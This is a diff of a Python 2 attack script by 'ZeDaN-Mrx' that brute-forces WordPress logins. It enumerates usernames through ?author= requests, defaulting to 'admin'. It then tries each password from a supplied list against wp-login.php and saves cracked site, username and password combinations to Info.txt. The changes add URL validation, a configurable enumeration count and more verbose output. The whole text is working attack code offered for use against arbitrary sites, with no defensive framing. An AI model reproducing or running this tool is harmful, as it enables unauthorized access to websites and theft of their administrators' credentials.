@@ -5,25 +5,24 @@ except ImportError :
     print "pip install requests"
     sys.exit()
 '''
-Only For Wordpress Sites ! 
+BruteForce Only For Wordpress Sites ! 
 By : ZeDaN-Mrx
-Usage : script.py http://localhost passlist.txt
-You Can Put +10k Pass List :D
-Email : Zedan-Mrx@bk.ru
-./FuHrer
 '''
-users = []
-Fuhrer = requests.session()
-site = sys.argv[1]
-try:
-	print "[+] Url is " + site
-except Exception, Mrx:
-	print "Check Site Please !\n" + str(Mrx)
-	sys.exit()
 class Zedan:
+	def check(self):
+		try:
+			oid = site.split("/")
+			odi = oid[2]
+			try:
+				dio = socket.gethostbyname(odi)
+			except:
+				exit(-1)
+		except:
+			print "[-] Please Check URL !"
+			exit(-1)
 	def xa(slef):
 		print "[+] Scanning"
-		for i in range(5):
+		for i in range(int(NUMX)):
 			send = site+'/?author='+str(i)
 			try:
 				o = Fuhrer.get(send)
@@ -31,12 +30,12 @@ class Zedan:
 					data = o.content
 					title = re.findall("<title>(.*?)</title>" , data)
 					user = re.search("(.*?) |" , title[0]).group(1)
-					print "[+] User Detected : "+user
+					print str(i)+"-"+"[+] User Detected : "+user
 					users.append(user)
 				else:
-					pass
+					print str(i)+"-"+"[-] Searching.."
 			except:
-				pass
+				print str(i)+"-"+"[-] Can't Detect User"
 
 			if len(users) == 0:
 				oo = users.append("admin")
@@ -60,31 +59,50 @@ class Zedan:
 							openitplz = urllib2.build_opener(urllib2.HTTPCookieProcessor(Cookies))
 							dataforlogin = urllib.urlencode({'log' : user, 'pwd' : password})
 							try:
-								f = Fuhrer.get(site+"/wp-login.php")
+								f4ck = site+"/wp-login.php"
+								f4ckwp = site+"/wp-admin"
+								f = Fuhrer.get(f4ck)
 								if f.status_code == 200:
 									try:
-										openitplz.open(str(site) + '/wp-login.php', dataforlogin)
-										resp = openitplz.open(str(site)+'/wp-admin')
-										final = resp.read()
-										if '<li id="wp-admin-bar-logout">' in final:
+										openitplz.open(str(f4ck), dataforlogin)
+										readitplz = openitplz.open(str(f4ckwp))
+										lastone = readitplz.read()
+										if '<li id="wp-admin-bar-logout">' in lastone:
 											print "[+] => Cracked | Done !"
-											open("Info.txt","a").writelines(site+"/wp-login.php#"+user+"@"+password+"\n")
+											with open("Info.txt","a") as nowwriteplz:
+												nowwriteplz.writelines(f4ck+"#"+user+"@"+password+"\n")
 											break
 										else:
-											print "[-] => Wrong LoginData !"
+											print "[-] => Wrong .:LoginData !"
 									except Exception, Mrx:
 										print "[!]" + str(Mrx)
 										sys.exit()
 							except Exception,Mrx:
-								print "[!] wp-login 404\n"+str(Mrx)
+								print "[!] WP-Login Error :  404\n"+str(Mrx)
 								sys.exit()
 		except Exception, Mrx:
 			print "[!]Usage : script.py http://localhost passlist.txt\n" + str(Mrx)
 			sys.exit()
-fd = Zedan()
-print """\n[+] Wordpress Sites BruteForce & Auto Username Detector By : ZeDaN-Mrx\n[+] Instagram : @xFuhr3r\n"""
-try:
+
+
+if __name__ == "__main__":
+	os.system('cls' if os.name == 'nt' else 'clear')
+	print """\n[+] Wordpress Sites BruteForce & Auto Username Detector By : ZeDaN-Mrx\n[+] Instagram : @xFuhr3r\n"""
+	users = []
+	Fuhrer = requests.session()
+	site = sys.argv[1]
+	try:
+		print "[+] Url is " + site
+	except Exception, Mrx:
+		print "Check Site Please !\n" + str(Mrx)
+		sys.exit()
+	NUMX = sys.argv[3]
+	try:
+		(int(NUMX))
+	except:
+		print "[-] Not Valid NuMber !"
+		exit(-1)
+	fd = Zedan()
+	fd.check()
 	fd.xa()
 	fd.brute()
-except:
-	pass
